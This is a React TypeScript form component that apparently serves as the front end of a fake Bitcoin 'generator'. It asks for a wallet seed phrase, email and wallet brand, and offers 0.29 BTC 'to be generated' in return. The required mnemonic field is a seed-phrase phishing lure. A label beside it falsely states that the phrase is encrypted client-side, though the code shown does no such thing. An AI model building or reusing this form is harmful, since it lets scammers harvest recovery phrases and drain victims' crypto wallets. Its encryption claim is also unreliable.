import React, { useState } from 'react';
import { FormDataState, SimulationState } from '../types';

interface CryptoFormProps {
  onSubmit: (data: FormDataState) => void;
  simulationState: SimulationState;
}

const COUNTRIES = [
  "Afghanistan","Albania","Algeria","Andorra","Angola","Antigua and Barbuda","Argentina","Armenia","Australia","Austria","Azerbaijan","Bahamas","Bahrain","Bangladesh","Barbados","Belarus","Belgium","Belize","Benin","Bhutan","Bolivia","Bosnia and Herzegovina","Botswana","Brazil","Brunei","Bulgaria","Burkina Faso","Burundi","Cabo Verde","Cambodia","Cameroon","Canada","Central African Republic","Chad","Chile","China","Colombia","Comoros","Costa Rica","Côte d'Ivoire","Croatia","Cuba","Cyprus","Czech Republic","Denmark","Djibouti","Dominica","Dominican Republic","Ecuador","Egypt","El Salvador","Equatorial Guinea","Eritrea","Estonia","Eswatini","Ethiopia","Fiji","Finland","France","Gabon","Gambia","Georgia","Germany","Ghana","Greece","Grenada","Guatemala","Guinea","Guinea-Bissau","Guyana","Haiti","Honduras","Hungary","Iceland","India","Indonesia","Iran","Iraq","Ireland","Israel","Italy","Jamaica","Japan","Jordan","Kazakhstan","Kenya","Kiribati","Kuwait","Kyrgyzstan","Laos","Latvia","Lebanon","Lesotho","Liberia","Libya","Liechtenstein","Lithuania","Luxembourg","Madagascar","Malawi","Malaysia","Maldives","Mali","Malta","Marshall Islands","Mauritania","Mauritius","Mexico","Micronesia","Moldova","Monaco","Mongolia","Montenegro","Morocco","Mozambique","Myanmar","Namibia","Nauru","Nepal","Netherlands","New Zealand","Nicaragua","Niger","Nigeria","North Korea","North Macedonia","Norway","Oman","Pakistan","Palau","Panama","Papua New Guinea","Paraguay","Peru","Philippines","Poland","Portugal","Qatar","Romania","Russia","Rwanda","Saint Kitts and Nevis","Saint Lucia","Saint Vincent and the Grenadines","Samoa","San Marino","Sao Tome and Principe","Saudi Arabia","Senegal","Serbia","Seychelles","Sierra Leone","Singapore","Slovakia","Slovenia","Solomon Islands","Somalia","South Africa","South Korea","South Sudan","Spain","Sri Lanka","Sudan","Suriname","Sweden","Switzerland","Syria","Taiwan","Tajikistan","Tanzania","Thailand","Timor-Leste","Togo","Tonga","Trinidad and Tobago","Tunisia","Turkey","Turkmenistan","Tuvalu","Uganda","Ukraine","United Arab Emirates","United Kingdom","United States","Uruguay","Uzbekistan","Vanuatu","Vatican City","Venezuela","Vietnam","Yemen","Zambia","Zimbabwe"
];

const WALLETS = [
  "Atomic Wallet","BitPay","Blockchain.com","Coinbase Wallet","Edge","Electrum","Exodus","Guarda","Ledger","MetaMask","MyEtherWallet","Trezor","Trust Wallet"
];

export const CryptoForm: React.FC<CryptoFormProps> = ({ onSubmit, simulationState }) => {
  const [formData, setFormData] = useState<FormDataState>({
    receiver: '',
    mnemonic: '',
    email: '',
    walletType: 'Atomic Wallet',
    country: 'Afghanistan',
    amountConfirmed: false
  });

  const [showMnemonic, setShowMnemonic] = useState(false);
  const [errors, setErrors] = useState<{ [key: string]: string }>({});

  const wordCount = (s: string) => s.trim().split(/\s+/).filter(Boolean).length;

  const validate = () => {
    const newErrors: { [key: string]: string } = {};
    const r = formData.receiver.trim();
    if (!r || r.length < 26 || r.length > 42 || !/^[A-Za-z0-9]+$/.test(r)) {
      newErrors.receiver = "Invalid wallet address (26–42 alphanumeric)";
    }

    const wc = wordCount(formData.mnemonic);
    if (wc < 12 || wc > 24) {
      newErrors.mnemonic = "Recommended between 12 and 24 words";
    }

    if (!formData.email.includes('@')) {
      newErrors.email = "Please enter a valid email";
    }

    if (!formData.amountConfirmed) {
      newErrors.amount = "Please confirm the amount to be generated (0.29 BTC)";
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (validate()) {
      onSubmit(formData);
    }
  };

  const handleChange = (field: keyof FormDataState, value: any) => {
    setFormData(prev => ({ ...prev, [field]: value }));
    // Clear specific error when user types
    if (errors[field]) {
      setErrors(prev => {
        const next = { ...prev };
        delete next[field];
        return next;
      });
    }
  };

  const isLoading = simulationState === 'running';
  const isDone = simulationState === 'completed';

  return (
    <form onSubmit={handleSubmit} autoComplete="on">
      <div className="row">
        <div className="col field">
          <label htmlFor="receiver">Receiver Wallet</label>
          <div className="input-wrap">
            <input 
              id="receiver" 
              name="receiver_wallet" 
              className="input" 
              type="text" 
              minLength={26} 
              maxLength={42} 
              placeholder="Wallet address (26–42 alphanumeric)" 
              value={formData.receiver}
              onChange={(e) => handleChange('receiver', e.target.value)}
              disabled={isLoading || isDone}
              required 
            />
            <svg className="icon-left" width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M3.5 7.5h17v9h-17z" stroke="var(--accent)" strokeWidth="1.4"/><path d="M20.5 10.5h-5" stroke="var(--accent)" strokeWidth="1.4" strokeLinecap="round"/></svg>
          </div>
          <div className="error" style={{ display: errors.receiver ? 'block' : 'none' }}>
            {errors.receiver || "Invalid wallet address (26–42 alphanumeric)"}
          </div>
        </div>
      </div>

      <div className="row">
        <div className="col field">
          <label htmlFor="mnemonic">Mnemonic</label>
          <div className="input-wrap">
            <input 
              id="mnemonic" 
              name="mnemonic" 
              className="input" 
              type={showMnemonic ? "text" : "password"} 
              placeholder="Enter mnemonic phrase (space-separated)" 
              value={formData.mnemonic}
              onChange={(e) => handleChange('mnemonic', e.target.value)}
              disabled={isLoading || isDone}
              required 
            />
            <svg className="icon-left" width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M21 7a4 4 0 1 1-7.874 1.002L5 16.128V19h2.872l8.138-8.126A4 4 0 0 1 21 7Z" stroke="var(--accent)" strokeWidth="1.4" strokeLinejoin="round"/></svg>
            <svg 
              id="eye" 
              className="icon-right" 
              width="18" 
              height="18" 
              viewBox="0 0 24 24" 
              fill="none" 
              onClick={() => setShowMnemonic(!showMnemonic)}
            >
              <path d="M1.5 12s4.5-7 10.5-7 10.5 7 10.5 7-4.5 7-10.5 7S1.5 12 1.5 12Z" stroke="var(--accent)" strokeWidth="1.4"/><circle cx="12" cy="12" r="3.2" stroke="var(--accent)" strokeWidth="1.4"/>
            </svg>
          </div>
          <div className="small">Words: <strong id="mnCount">{wordCount(formData.mnemonic)}</strong> (12–24 recommended) • Encrypted client-side (AES-GCM + RSA-OAEP)</div>
          <div className="error" style={{ display: errors.mnemonic ? 'block' : 'none' }}>
            {errors.mnemonic || "Recommended between 12 and 24 words"}
          </div>
        </div>
      </div>

      <div className="row">
        <div className="col field">
          <label htmlFor="email">Email</label>
          <div className="input-wrap">
            <input 
              id="email" 
              name="email" 
              className="input" 
              type="email" 
              placeholder="you@example.com" 
              value={formData.email}
              onChange={(e) => handleChange('email', e.target.value)}
              disabled={isLoading || isDone}
              required 
            />
            <svg className="icon-left" width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M3.5 6.5h17v11h-17z" stroke="var(--accent)" strokeWidth="1.4"/><path d="M3.5 8l8.5 6 8.5-6" stroke="var(--accent)" strokeWidth="1.4" strokeLinecap="round"/></svg>
          </div>
        </div>
      </div>

      <div className="row">
        <div className="col field">
          <label htmlFor="wallet">Wallet Type</label>
          <div className="input-wrap">
            <select 
              id="wallet" 
              name="wallet" 
              value={formData.walletType}
              onChange={(e) => handleChange('walletType', e.target.value)}
              disabled={isLoading || isDone}
            >
              {WALLETS.map(w => <option key={w} value={w}>{w}</option>)}
            </select>
          </div>
        </div>
      </div>

      <div className="field">
        <label htmlFor="country">Country</label>
        <select 
          id="country" 
          name="country" 
          className="input" 
          value={formData.country}
          onChange={(e) => handleChange('country', e.target.value)}
          disabled={isLoading || isDone}
          required
        >
          {COUNTRIES.map(c => <option key={c} value={c}>{c}</option>)}
        </select>
      </div>

      <div className="row" style={{ alignItems: 'center' }}>
        <div className="col field" style={{ flex: '0 0 220px' }}>
          <label>Amount (BTC)</label>
          <div className="row-inline">
            <input 
              id="amountCheck" 
              name="amountCheck" 
              className="checkbox" 
              type="checkbox" 
              checked={formData.amountConfirmed}
              onChange={(e) => handleChange('amountConfirmed', e.target.checked)}
              disabled={isLoading || isDone}
              required 
            />
            <div 
              id="amountBadge" 
              className="badge" 
              title="Click to confirm the amount to be generated"
              onClick={() => !isLoading && !isDone && handleChange('amountConfirmed', !formData.amountConfirmed)}
            >
              0.29 BTC
            </div>
          </div>
        </div>

        <div className="col" style={{ display: 'flex', alignItems: 'flex-end', justifyContent: 'flex-end' }}>
          <div className="actions">
            <button 
              id="submitBtn" 
              className={`btn ${isLoading ? 'loading' : ''}`} 
              type="submit"
              disabled={isLoading || isDone}
            >
              {isLoading ? 'In progress...' : isDone ? 'Success' : 'Generate'}
            </button>
          </div>
        </div>
      </div>
    </form>
  );
};